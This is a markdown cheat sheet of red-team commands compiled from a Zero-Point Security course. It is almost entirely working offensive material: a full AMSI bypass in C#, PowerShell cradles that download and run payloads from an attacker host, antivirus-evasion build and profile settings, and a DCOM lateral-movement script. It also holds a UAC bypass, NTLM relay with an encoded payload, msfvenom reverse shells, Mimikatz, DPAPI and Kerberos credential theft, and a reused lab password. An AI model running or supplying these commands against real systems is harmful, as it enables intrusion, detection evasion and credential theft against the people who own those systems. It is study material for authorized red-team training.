# Zero-Point Security Red Team Operations (RTO) I
All the commands from the course, generalized and tweaked to suit my needs, organized in a logical order

***DO NOT USE THIS DOCUMENT AS IS***
1. download this markdown file, and open it in [Obisidan](https://obsidian.md)
2. in Settings → Core Plugins, enable Outline, then run "Outline: Show Outline" in the command palette
     - Now you can quickly jump to a particular section by clicking its heading in the outline.
3. in Settings → Community plugins → Browse, find and install "Copy Inline Code"
     - Now you can copy any command by clicking on the end of it.
4. enter "reading" view by clicking the book in the top-right (by default)
     - Now you can see commands for linked sections by hovering over them.

## Microsoft Defender Antivirus
`Get-MpThreatDetection | sort $_InitialDetectionTime | select -First 1`
#### Artifact Kit

Build
`cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact`
`./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts`
Detect Threats
`C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\[artifact].exe`
#### Resource Kit

Build
`cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource`
`./build.sh /mnt/c/Tools/cobaltstrike/resources`

Detect Threats
`C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\[resource].ps1 -e amsi`
#### Manual AMSI Bypasses
use with PowerShell payloads

AMSI Bypass → host at /bypass
```powershell
$HWBP = @"
using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace HWBP {
	public class Amsi {
		static string a = "msi";
		static string b = "anB";
		static string c = "ff";
		static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
		static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
		static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
		
		public static void Bypass() {
			WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
			ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;
			
			MethodInfo method = typeof(Amsi).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
			IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
			
			Marshal.StructureToPtr(ctx, pCtx, true);
			bool b = WinAPI.GetThreadContext((IntPtr)(-2), pCtx);
			ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));
			
			EnableBreakpoint(ctx, pABuF, 0);
			WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
		}
		
		public static long Handler(IntPtr exceptions)
		{
			WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
			ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));
			
			WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
			ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));
			
			WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
			ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));
			
			if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF) {
				ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);
				
				IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean
				
				Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);
				
				ContextRecord.Rip = ReturnAddress;
				ContextRecord.Rsp += 8;
				ContextRecord.Rax = 0; // S_OK
				
				Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
				return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
			} else {
				return WinAPI.EXCEPTION_CONTINUE_SEARCH;
			}
		}
		
		public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index) {
		switch (index) {
			case 0:
				ctx.Dr0 = (ulong)address.ToInt64();
				break;
			case 1:
				ctx.Dr1 = (ulong)address.ToInt64();
				break;
			case 2:
				ctx.Dr2 = (ulong)address.ToInt64();
				break;
			case 3:
				ctx.Dr3 = (ulong)address.ToInt64();
				break;
		}
		
		ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
		ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
		ctx.Dr6 = 0;
		
		Marshal.StructureToPtr(ctx, pCtx, true);
		}
		
		public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue) {
			ulong mask = (1UL << bits) - 1UL;
			dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
			return dw;
		}
	}
	
	public class WinAPI {
		public const UInt32 DBG_CONTINUE = 0x00010002;
		public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
		public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
		public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
		public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
		public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
		public const Int32 EXCEPTION_DEBUG_EVENT = 1;
		public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
		public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
		public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
		public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
		public const Int32 RIP_EVENT = 9;
		public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;
		
		public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
		public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
		public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
		public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
		public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
		public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
		public const UInt32 DBG_CONTROL_C = 0x40010006;
		public const UInt32 DEBUG_PROCESS = 0x00000001;
		public const UInt32 CREATE_SUSPENDED = 0x00000004;
		public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;
		
		public const Int32 AMSI_RESULT_CLEAN = 0;
		
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
		
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
		
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
		
		[DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
		
		[DllImport("Kernel32.dll")]
		public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
		
		[Flags]
		public enum CONTEXT64_FLAGS : uint {
			CONTEXT64_AMD64 = 0x100000,
			CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
			CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
			CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
			CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
			CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
			CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
			CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
		}
		
		[StructLayout(LayoutKind.Sequential)]
		public struct M128A {
			public ulong High;
			public long Low;
			
			public override string ToString()
			{
				return string.Format("High:{0}, Low:{1}", this.High, this.Low);
			}
		}
		
		[StructLayout(LayoutKind.Sequential, Pack = 16)]
		public struct XSAVE_FORMAT64 {
			public ushort ControlWord;
			public ushort StatusWord;
			public byte TagWord;
			public byte Reserved1;
			public ushort ErrorOpcode;
			public uint ErrorOffset;
			public ushort ErrorSelector;
			public ushort Reserved2;
			public uint DataOffset;
			public ushort DataSelector;
			public ushort Reserved3;
			public uint MxCsr;
			public uint MxCsr_Mask;
			
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
			public M128A[] FloatRegisters;
			
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
			public M128A[] XmmRegisters;
			
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
			public byte[] Reserved4;
		}
		
		[StructLayout(LayoutKind.Sequential, Pack = 16)]
		public struct CONTEXT64 {
			public ulong P1Home;
			public ulong P2Home;
			public ulong P3Home;
			public ulong P4Home;
			public ulong P5Home;
			public ulong P6Home;
			
			public CONTEXT64_FLAGS ContextFlags;
			public uint MxCsr;
			
			public ushort SegCs;
			public ushort SegDs;
			public ushort SegEs;
			public ushort SegFs;
			public ushort SegGs;
			public ushort SegSs;
			public uint EFlags;
			
			public ulong Dr0;
			public ulong Dr1;
			public ulong Dr2;
			public ulong Dr3;
			public ulong Dr6;
			public ulong Dr7;
			
			public ulong Rax;
			public ulong Rcx;
			public ulong Rdx;
			public ulong Rbx;
			public ulong Rsp;
			public ulong Rbp;
			public ulong Rsi;
			public ulong Rdi;
			public ulong R8;
			public ulong R9;
			public ulong R10;
			public ulong R11;
			public ulong R12;
			public ulong R13;
			public ulong R14;
			public ulong R15;
			public ulong Rip;
			
			public XSAVE_FORMAT64 DUMMYUNIONNAME;
			
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
			public M128A[] VectorRegister;
			public ulong VectorControl;
			
			public ulong DebugControl;
			public ulong LastBranchToRip;
			public ulong LastBranchFromRip;
			public ulong LastExceptionToRip;
			public ulong LastExceptionFromRip;
		}
		
		[StructLayout(LayoutKind.Sequential)]
		public struct EXCEPTION_RECORD {
			public uint ExceptionCode;
			public uint ExceptionFlags;
			public IntPtr ExceptionRecord;
			public IntPtr ExceptionAddress;
			public uint NumberParameters;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
		}
		
		[StructLayout(LayoutKind.Sequential)]
		public struct EXCEPTION_POINTERS {
			public IntPtr pExceptionRecord;
			public IntPtr pContextRecord;
		}
	}
}
"@

Add-Type -TypeDefinition $HWBP
[HWBP.Amsi]::Bypass()
```
##### PowerShell Payload (base64)
Windows
`$str = 'IEX(IWR -Uri http://[host]:[port]/bypass -UseBasicParsing);IEX(IWR -Uri http://[host]:[port]/[payload] -UseBasicParsing)'`
`[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))`

Linux
`set str 'IEX(IWR http://[host]/bypass -UseBasicParsing);IEX(IWR http://[host]/[payload] -UseBasicParsing)'`
`echo -en $str | iconv -t UTF-16LE | base64 -w 0`
#### Profile Changes
/home/attacker/cobaltstrike/teamserver/c2-profiles/custom/custom.profile
```
set sleeptime "1";
set tasks_max_size "2097152";

stage {
	set userwx "false";
	set cleanup "true";
	set obfuscate "true";
	set module_x64 "xpsservices.dll";
}

post-ex {
	set amsi_disable "true";
	set spawnto_x64 "C:\\Windows\\System32\\dllhost.exe";
	set spawnto_x86 "C:\\Windows\\SysWOW64\\dllhost.exe";
}
```
## Extending Cobalt Strike
#### Mimikatz Kit
`cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/mimikatz`
`./build.sh /mnt/c/Tools/cobaltstrike/mimikatz`
#### Jump and Remote-Exec
C:\\Tools\\cobaltstrike\\custom\\dcom.cna
```php
sub invoke_dcom
{
	local('$handle $script $oneliner $payload');
	
	# acknowledge this command1
	btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
	
	# read in the script
	$handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
	$script = readb($handle, -1);
	closef($handle);
	
	# host the script in Beacon
	$oneliner = beacon_host_script($1, $script);
	
	# generate stageless payload
	$payload = artifact_payload($3, "exe", "x64");
	
	# upload to the target
	bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);
	
	# run via powerpick
	bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);
	
	# link if p2p beacon
	beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```
#### Scripts
Cobalt Strike → Script Manager → Load
`C:\Tools\cobaltstrike\elevate-kit\elevate.cna`
`C:\Tools\SCMUACBypass\scmuacbypass.cna`
`C:\Tools\cobaltstrike\artifacts\pipe\artifact.cna`
`C:\Tools\cobaltstrike\resources\resources.cna`
`C:\Tools\cobaltstrike\mimikatz\mimikatz.cna`
`C:\Tools\cobaltstrike\custom\dcom.cna`
`C:\Tools\PortBender\PortBender.cna`
## Command & Control
#### Running as a Service
/etc/systemd/system/teamserver.service
```systemd
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 S@lcianaszkot23 c2-profiles/custom/custom.profile

[Install]
WantedBy=multi-user.target
```

`sudo systemctl daemon-reload`
`sudo systemctl enable teamserver.service`
`sudo systemctl start teamserver.service`
#### Serving Payload Internally (SMB)

Find Writeable Share
`powerpick Find-DomainShare -CheckShareAccess`
`cd \\[computer]\[share]`
`upload C:\Payloads\dns_x64.exe`- change payload if desired

Create New Share
`run mkdir C:\share`
`cd C:\share`
`upload C:\Payloads\dns_x64.exe`- change payload if desired
`powershell New-SmbShare -Name "share" -Path "C:\share" -ReadAccess "[domain]\Domain Users"`
Remove Share
`powershell Remove-SmbShare -Name "share" -Force`
## Initial Compromise
#### Password Spraying
`ipmo C:\Tools\MailSniper\MailSniper.ps1`
`Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io`

Check Usernames
`Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList possible.txt -OutFile valid.txt`

Spray Passwords
`Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022`

Get all Users (with valid creds)
`Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile gal.txt`
#### VBA Macros
```vb
Sub AutoOpen()
	Dim Shell As Object
	Set Shell = CreateObject("wscript.shell")
	Shell.Run "notepad"
End Sub
```
#### Remote Template Injection
`remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx`
#### HTML Smuggling
```html
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```
## Host Reconnaissance
`execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system`
#### Screenshot
`screenshot`
`printscreen`
`screenwatch`
#### Keylogger
`keylogger`
`jobs`
`jobkill 6`
#### Clipboard
`clipboard`
#### User Sessions
`net logons`
## Domain Reconnaissance
`powershell Get-ADComputer -Filter * -Properties IPv4Address | select Name,DNSHostName,IPv4Address`
#### PowerView
`powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1`

Domain
`powerpick Get-Domain`
`powerpick Get-DomainController | select Forest, Name, OSVersion | fl`
`powerpick Get-ForestDomain`
`powerpick Get-DomainTrust`
`powerpick Get-DomainPolicyData | select -expand SystemAccess`

OU
`powerpick Get-DomainUser | select SamAccountName`
`powerpick Get-DomainUser -Identity "[user]" -Properties DisplayName, MemberOf | fl`
`powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName`
`powerpick Get-DomainOU -Properties Name | sort -Property Name`

Group
`powerpick Get-DomainGroup | select SamAccountName`
`powerpick Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName`
`powerpick Get-DomainGroupMember -Identity "[group]" | select MemberName`

GPO
`powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName`
`powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName`
`powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl`→ **GPODisplayName** grants users in group **ObjectName** local Administrator on **ComputerName**

Shares
`powerpick Find-DomainShare -CheckShareAccess`
`powerpick Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*`
`powershell Get-Content [share file] | select -first 5`
#### ADSearch

Users
`execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user" --attributes samaccountname`

Admins
`execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectclass=user)(admincount=1))"`
`execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"`
`execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=[group]))" --attributes cn,member`
## Host Privilege Escalation
`execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath ModifiableServices ModifiableServiceBinaries`
#### Unquoted Service Path
`run wmic service get name,pathname`
`powershell Get-Acl -Path "[path]" | fl`
#### Weak Service Permissions
`powershell-import C:\Tools\Get-ServiceAcl.ps1`
`powershell Get-ServiceAcl -Name [service] | select -expand Access`

`cd C:\Windows\Tasks`
`upload C:\Payloads\local_x64.svc.exe`
`run sc config [service] binPath= C:\Windows\Tasks\local_x64.svc.exe`
`run sc qc [service]`
`connect localhost 4444`
#### Weak Service Binary Permissions
`powershell Get-Acl -Path "[path]" | fl`
`download [service binary]`
#### UAC Bypass
`run whoami /groups`
`elevate uac-schtasks local`
`runasadmin uac-cmstplua powershell "IEX(IWR -Uri http://nickelviper.com/bypass -UseBasicParsing);IEX(IWR -Uri http://nickelviper.com/[payload] -UseBasicParsing)"`
## Credential Theft

Mimikatz Symbols
- ! ⇒ `token::elevate`
- @ ⇒ impersonate beacon thread token (use with dcsync)
#### Passwords and Hashes
`mimikatz !sekurlsa::logonpasswords`
`mimikatz !sekurlsa::ekeys`
`mimikatz !lsadump::sam`
`mimikatz !lsadump::cache`
`dcsync [fqdn] [netbios]\krbtgt`
#### Kerberos Tickets
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:[luid] /service:krbtgt /nowrap`

`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap`
## User Impersonation
`rev2self`
#### Pass-the-Password
`make_token [domain]\[user] [password]`
#### Pass-the-Hash
`pth [domain]\[user] [hash]`
`mimikatz sekurlsa::pth /domain:[domain] /user:[user] /ntlm:[hash] /run:cmd.exe`
`steal_token [pid]`
#### Pass-the-Ticket
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ticket:[ticket]`
`steal_token [pid]`
#### Overpass-the-Hash
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /domain:[domain] /user:[user] /aes256:[hash] /opsec /nowrap`
[[#Pass-the-Ticket]]
#### Token Impersonation
`ps`
`steal_token [pid]`

Token Store
`token-store show`
`token-store steal [pid]`
`token-store use [id]`
`token-store remove [id]`
`token-store remove-all`
#### Process Injection
`inject [pid] x64 local`
## Lateral Movement
`execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe [module] -ComputerName=[target]`

`ak-settings`
`ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe`
`ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe`

`portscan [target] 445`
#### WinRM
`jump winrm64 [target] smb`
#### PsExec
`jump psexec64 [target] smb`
#### WMI
`cd \\[target]\ADMIN$`
`upload C:\Payloads\smb_x64.exe`
`remote-exec wmi [target] C:\Windows\smb_x64.exe`
`execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=[target] command="C:\Windows\smb_x64.exe"`
`link [target] [pipe]`
#### DCOM
`cd \\[target]\ADMIN$`
`upload C:\Payloads\smb_x64.exe`
`powershell-import C:\Tools\Invoke-DCOM.ps1`
`powerpick Invoke-DCOM -ComputerName [target] -Method MMC20.Application -Command C:\Windows\smb_x64.exe`
`link [target] [pipe]`
## Session Passing
`spawn x64 http`
#### Foreign Listener (Meterpreter)
`msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_http;set LHOST ens5;set LPORT 8080;run'`
`spawn msf`
#### Custom Foreign Listener
`msfvenom -p windows/x64/meterpreter_reverse_http LHOST=[ip] LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin`

`msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_http;set LHOST ens5;set LPORT 8080;run'`
`shspawn x64 C:\Payloads\msf_http_x64.bin`
## Pivoting
#### Socks Proxy
`socks 1080`
`socks 1080 socks5 disableNoAuth john S@lcianaszkot23 enableLogging`
#### Linux
/etc/proxychains.conf
```
#proxy_dns
remote_dns

socks5 127.0.0.1 1080 john S@lcianaszkot23
```

`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap`
`echo -en '[ticket]' | base64 -d > ticket.kirbi`
`ticketConverter.py ticket.kirbi ticket.ccache`
`export KRB5CCNAME=ticket.ccache`
`proxychains [script].py -no-pass -k -dc-ip [dc] [domain]/[user]@[host]`
#### Windows
`runas /netonly /user:[domain]\[user] mmc.exe`

`C:\Tools\mimikatz\x64\mimikatz.exe`
`privilege::debug`
`sekurlsa::pth /domain:[domain] /user:[user] /ntlm:[hash] /run:mmc.exe`

`runas /netonly /user:[domain]\[user] powershell.exe`
`C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[tgt] /service:[spn]/[host] /dc:[dc] /ptt`
#### Reverse Port Forward
`powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080`
`rportfwd 8080 127.0.0.1 80`

`powershell Remove-NetFirewallRule -DisplayName "8080-In"`
#### NTLM Relay
`powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445`
`powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080`

`cd C:\Windows\System32\Drivers`
`upload C:\Tools\PortBender\WinDivert64.sys`
`PortBender redirect 445 8445`
`rportfwd 8445 localhost 445`
`rportfwd 8080 localhost 80`
`socks 1080 socks5 disableNoAuth john S@lcianaszkot23 enableLogging`

[[#PowerShell Payload (base64)]]
`sudo proxychains ntlmrelayx.py -t smb://[target ip] -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc [base64]'`
`link [target] [pipe]`

Cleanup
`powershell Remove-NetFirewallRule -DisplayName "8445-In"`
`powershell Remove-NetFirewallRule -DisplayName "8080-In"`

`jobs`
`jobkill [jid]`
`kill [pid]`

`rportfwd stop 8445`
`rportfwd stop 8080`
`socks stop`
#### Forcing NTLM Authentication

Remote Authentication Triggers
`execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe [target] [beacon]`
`execute-assembly C:\Tools\SharpSystemTriggers\SharpEfsTrigger\bin\Release\SharpEfsTrigger.exe [target] [beacon]`

Windows Shortcut
`powerpick Find-DomainShare -CheckShareAccess`

`$wsh = new-object -ComObject wscript.shell`
`$shortcut = $wsh.CreateShortcut("[share]\test.lnk")`
`$shortcut.IconLocation = "\\[beacon]\test.ico"`
`$shortcut.Save()`

1x1 image in emails: `<img src="\\[beacon]\test.ico" height="1" width="1" />`
## DPAPI

Credentials Locations
- Windows Credentials: `C:\Users\[username]\AppData\Local\Microsoft\Credentials`
- Scheduled Task Credentials: `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials`
- Master Keys: `C:\Users\[username]\AppData\Roaming\Microsoft\Protect`

`run vaultcmd /list`
`run vaultcmd /listcreds:"Windows Credentials" /all`
`run vaultcmd /listcreds:"Web Credentials" /all`

`execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault`
`execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles`→ shows cred and master key files (skip to [[#Obtain Master Key]])
#### Determine Cred Files
User Credentials
`ls C:\Users\[user]\AppData\Local\Microsoft\Credentials`
Cred File: `C:\Users\[user]\AppData\Local\Microsoft\Credentials\[file]`
**Note:** You would have to check this for each user. Consider using Seatbelt instead (above).

Scheduled Task Credentials
`ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials`
Cred File: `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\[file]`
#### Determine Master Key File
(user credentials only)
`mimikatz dpapi::cred /in:[credfile]`
Key File: `C:\Users\[user]\AppData\Roaming\Microsoft\Protect\[sid]\[MasterKey]`
#### Obtain Master Key
as system: `mimikatz !sekurlsa::dpapi`
as user: `mimikatz @dpapi::masterkey /in:[keyfile] /rpc`
#### Decrypt Credentials
`mimikatz dpapi::cred /in:[credfile] /masterkey:[key]`
## Kerberos
#### Service Tickets
| Technique | Service Tickets |
| ---- | ---- |
| psexec | host, cifs |
| winrm | host, http |
| dcsync | ldap |
use cifs to `ls`
#### Kerberoasting
`execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:[user] /nowrap`

`hashcat -a 0 -m 13100 [hash] [wordlist]`
`john --format=krb5tgs --wordlist=[wordlist] [hash]`
#### AS-REP Roasting
`execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:[user] /nowrap`

`hashcat -a 0 -m 18200 [hash] [wordlist]`
`john --format=krb5asrep --wordlist=[wordlist] [hash]`
#### Unconstrained Delegation
`execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname`

User
[[#Kerberos Tickets]] → [[#Pass-the-Ticket]]

Computer
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:1 /nowrap`
[[#Forcing NTLM Authentication]]
[[#S4U2Self]]
#### Constrained Delegation
`execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json`

[[#Kerberos Tickets]]
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:[user (any)] /msdsspn:[spn] /user:[user (principal)] /ticket:[base64 (principal)] /nowrap`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:[domain] /username:[impersonate user] /password:FakePass /ticket:[base64 (previous command)]`
`steal_token [pid]`

Alternative Service Name
see [[#Service Tickets]]
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:[user (any)] /msdsspn:[spn] /altservice:[service] /user:[user (principal)] /ticket:[base64 (principal)] /nowrap`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:[domain] /username:[impersonate user] /password:FakePass /ticket:[base64 (previous command)]`
`steal_token [pid]`
#### S4U2Self
see [[#Service Tickets]]
